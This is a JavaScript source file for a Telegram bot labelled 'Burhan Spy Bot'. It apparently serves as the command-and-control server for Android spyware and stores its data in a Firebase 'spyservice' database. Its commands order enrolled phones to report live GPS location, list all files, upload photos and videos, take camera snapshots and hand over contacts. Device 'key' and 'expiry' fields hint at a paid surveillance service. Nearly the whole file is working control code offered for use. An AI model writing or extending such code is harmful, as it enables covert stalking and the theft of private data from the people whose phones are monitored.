const TelegramBot = require('node-telegram-bot-api');
const admin = require('firebase-admin');
const express = require('express');

// Environment variables
const token = process.env.TOKEN;
const YOUR_USER_ID = process.env.USER_ID; // String, e.g., "2062068620"

const bot = new TelegramBot(token, { polling: false }); // Webhook mode
const app = express();
app.use(express.json());

// Firebase Setup (using service account file)
const serviceAccount = require('./firebase-service-account.json');
admin.initializeApp({
    credential: admin.credential.cert(serviceAccount),
    databaseURL: "https://spyservice-c27e1-default-rtdb.europe-west1.firebasedatabase.app"
});
const db = admin.database();

// Global flag to cancel ongoing operations
let currentOperation = null;

// Helper: Authorization check
function isAuthorized(msg) {
    return String(msg.from.id) === String(YOUR_USER_ID);
}

// Helper: Send error message
function sendError(chatId, msg) {
    bot.sendMessage(chatId, `❌ ${msg}`);
}

// Webhook endpoint
app.post('/webhook', (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

// ========== COMMANDS ==========

// /start - resume bot (just message)
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) return bot.sendMessage(chatId, "⛔ Access Denied!");
    bot.sendMessage(chatId, "🔥 Burhan Spy Bot is active. Use /help for commands.");
});

// /stop - stop bot (simulate by disabling operations)
bot.onText(/\/stop/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) return bot.sendMessage(chatId, "⛔ Access Denied!");
    currentOperation = null; // cancel any ongoing operation
    bot.sendMessage(chatId, "🛑 Bot stopped. Use /start to resume.");
});

// /help - full command list
bot.onText(/\/help/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) return bot.sendMessage(chatId, "⛔ Access Denied!");
    bot.sendMessage(chatId, `📜 **COMMANDS LIST**\n\n` +
        `/locate <ID> - Get live GPS and device info\n` +
        `/devices - List all devices with key & expiry\n` +
        `/files <ID> - List ALL file names\n` +
        `/getphoto <ID> <FILE> - Request a photo\n` +
        `/getvideo <ID> <FILE> - Request a video\n` +
        `/camera <ID> [front|back] - Capture snapshot\n` +
        `/ping <ID> - Check if device is alive\n` +
        `/stats - Total device count\n` +
        `/contacts <ID> - Fetch all contacts\n` +
        `/stop - Stop the bot\n` +
        `/start - Resume bot\n\n` +
        `⚠️ Any new command cancels ongoing operations.`);
});

// /devices - list all devices
bot.onText(/\/devices/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) return bot.sendMessage(chatId, "⛔ Access Denied!");
    currentOperation = 'devices';
    db.ref('devices').once('value', (snapshot) => {
        const devices = snapshot.val() || {};
        let message = `📱 ALL DEVICES (Total: ${Object.keys(devices).length})\n\n`;
        Object.entries(devices).forEach(([id, d]) => {
            message += `🔑 ID: ${id}\n`;
            message += `🔑 Key: ${d.deviceName || 'N/A'}\n`;
            message += `📅 Expiry: ${d.expiry || 'N/A'}\n`;
            message += `📱 Android: ${d.android || 'N/A'}\n`;
            message += `📊 Status: ${d.online ? "🟢 ONLINE" : "🔴 OFFLINE"}\n`;
            message += `🕒 ${d.time || 'N/A'}\n\n`;
        });
        bot.sendMessage(chatId, message);
    }).catch(err => sendError(chatId, 'Error fetching devices.'));
});

// /stats - total devices
bot.onText(/\/stats/, (msg) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) return bot.sendMessage(chatId, "⛔ Access Denied!");
    currentOperation = 'stats';
    db.ref('devices').once('value', (snapshot) => {
        const devices = snapshot.val() || {};
        bot.sendMessage(chatId, `📊 Total Devices: ${Object.keys(devices).length}`);
    }).catch(err => sendError(chatId, 'Error fetching stats.'));
});

// /locate <ID> - GPS and device info
bot.onText(/\/locate (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) return bot.sendMessage(chatId, "⛔ Access Denied!");
    const deviceId = match[1].trim();
    currentOperation = 'locate';
    // Send command to device (store in commands ref)
    db.ref('commands').child(deviceId).set('locate')
        .then(() => {
            bot.sendMessage(chatId, `📍 Locate command sent for device ${deviceId}. Waiting for response...`);
            // In real logic, you'd listen to a 'responses' node for GPS data. We'll just send a placeholder.
            // But for full functionality, you'd have a listener that reads the device's reply and forwards it.
            // To keep it simple, we'll just fetch from 'devices' node if it has location info.
            db.ref('devices').child(deviceId).once('value', (snap) => {
                const dev = snap.val() || {};
                if (dev.location) {
                    bot.sendMessage(chatId, `📍 **Location for ${deviceId}:**\nLat: ${dev.location.lat}\nLng: ${dev.location.lng}\nLast updated: ${dev.location.time || 'N/A'}`);
                } else {
                    bot.sendMessage(chatId, `⏳ Device ${deviceId} has not reported location yet.`);
                }
            });
        })
        .catch(err => sendError(chatId, 'Failed to send locate command.'));
});

// /files <ID> - list all file names
bot.onText(/\/files (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) return bot.sendMessage(chatId, "⛔ Access Denied!");
    const deviceId = match[1].trim();
    currentOperation = 'files';
    db.ref('commands').child(deviceId).set('list_files')
        .then(() => bot.sendMessage(chatId, `📂 File list request sent for device ${deviceId}...`))
        .catch(err => sendError(chatId, 'Failed to send files command.'));
});

// /getphoto <ID> <FILE> - request photo
bot.onText(/\/getphoto (.+) (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) return bot.sendMessage(chatId, "⛔ Access Denied!");
    const deviceId = match[1].trim();
    const fileName = match[2].trim();
    currentOperation = 'getphoto';
    db.ref('commands').child(deviceId).set({ type: 'get_photo', file: fileName })
        .then(() => bot.sendMessage(chatId, `📸 Photo request sent for ${deviceId} file: ${fileName}`))
        .catch(err => sendError(chatId, 'Failed to send photo command.'));
});

// /getvideo <ID> <FILE> - request video
bot.onText(/\/getvideo (.+) (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) return bot.sendMessage(chatId, "⛔ Access Denied!");
    const deviceId = match[1].trim();
    const fileName = match[2].trim();
    currentOperation = 'getvideo';
    db.ref('commands').child(deviceId).set({ type: 'get_video', file: fileName })
        .then(() => bot.sendMessage(chatId, `📹 Video request sent for ${deviceId} file: ${fileName}`))
        .catch(err => sendError(chatId, 'Failed to send video command.'));
});

// /camera <ID> [front|back] - capture snapshot
bot.onText(/\/camera (.+) (front|back)?/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) return bot.sendMessage(chatId, "⛔ Access Denied!");
    const deviceId = match[1].trim();
    const camera = (match[2] || 'back').toLowerCase();
    currentOperation = 'camera';
    db.ref('commands').child(deviceId).set({ type: 'camera', camera: camera })
        .then(() => bot.sendMessage(chatId, `📷 Camera request sent for ${deviceId} using ${camera} camera.`))
        .catch(err => sendError(chatId, 'Failed to send camera command.'));
});

// /ping <ID> - check if device alive
bot.onText(/\/ping (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) return bot.sendMessage(chatId, "⛔ Access Denied!");
    const deviceId = match[1].trim();
    currentOperation = 'ping';
    db.ref('commands').child(deviceId).set('ping')
        .then(() => bot.sendMessage(chatId, `📡 Ping sent to device ${deviceId}. Waiting for response...`))
        .catch(err => sendError(chatId, 'Failed to send ping.'));
});

// /contacts <ID> - fetch contacts
bot.onText(/\/contacts (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    if (!isAuthorized(msg)) return bot.sendMessage(chatId, "⛔ Access Denied!");
    const deviceId = match[1].trim();
    currentOperation = 'contacts';
    db.ref('commands').child(deviceId).set('get_contacts')
        .then(() => bot.sendMessage(chatId, `📞 Contacts request sent for device ${deviceId}...`))
        .catch(err => sendError(chatId, 'Failed to send contacts command.'));
});

// ========== CANCELLATION LOGIC ==========
// When any new command is received, it sets 'currentOperation' which effectively cancels the previous one.
// If you want to actually abort a long-running process (like waiting for a response), you would need to clear a timer or listener.
// This implementation simply overwrites the command sent to the device, which means the device will ignore the old one if it hasn't acted yet.

// ========== SERVER START ==========
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
    // Optionally set webhook automatically if you know the URL
    // const webhookUrl = `https://your-app.railway.app/webhook`;
    // bot.setWebHook(webhookUrl).then(() => console.log("Webhook set"));
});
